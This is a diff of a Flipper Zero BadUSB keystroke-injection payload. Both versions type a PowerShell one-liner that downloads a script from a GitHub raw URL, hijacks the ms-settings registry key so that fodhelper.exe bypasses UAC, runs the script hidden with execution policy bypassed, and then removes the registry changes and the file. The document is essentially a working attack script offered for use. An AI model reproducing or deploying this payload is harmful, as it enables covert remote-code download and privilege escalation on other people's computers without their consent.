@@ -1,8 +1,8 @@
-REM BadUSB Payload to Bypass UAC and Run Bluetooth Pairing Script
-REM Downloads the script from GitHub to avoid encoding issues, then uses fodhelper.exe UAC bypass
+REM Simple and Robust BadUSB Payload for Flipper Zero
+REM Downloads script from GitHub and runs with UAC bypass using fodhelper.exe
 
 DELAY 1000
 GUI r
 DELAY 500
-STRING powershell -Command "New-Item -ItemType Directory -Path C:\temp -Force; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Marcopit92/Flipper-zero/refs/heads/main/dw_scripts/auto_pair_bt/auto_pair_badkb.ps1' -OutFile 'C:\temp\badkb.ps1'; New-Item -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Force; Set-ItemProperty -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Name DelegateExecute -Value '' -Force; Set-ItemProperty -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Name '(default)' -Value 'powershell -ExecutionPolicy Bypass -File ''C:\temp\badkb.ps1'' -WindowStyle Hidden' -Force; Start-Process 'C:\Windows\System32\fodhelper.exe'; Start-Sleep 15; Remove-ItemProperty -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Name DelegateExecute -Force; Remove-ItemProperty -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Name '(default)' -Force; Remove-Item 'C:\temp\badkb.ps1' -Force; Remove-Item 'C:\temp' -Force"
+STRING powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Marcopit92/Flipper-zero/refs/heads/main/dw_scripts/auto_pair_bt/auto_pair_badkb.ps1' -OutFile 'C:\temp\badkb.ps1'; New-Item -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Force; Set-ItemProperty -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Name DelegateExecute -Value '' -Force; Set-ItemProperty -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Name '(default)' -Value 'powershell -ExecutionPolicy Bypass -File ''C:\temp\badkb.ps1'' -WindowStyle Hidden' -Force; Start-Process 'C:\Windows\System32\fodhelper.exe'; Start-Sleep 15; Remove-ItemProperty -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Name DelegateExecute -Force; Remove-ItemProperty -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Name '(default)' -Force; Remove-Item 'C:\temp\badkb.ps1' -Force"
 ENTER
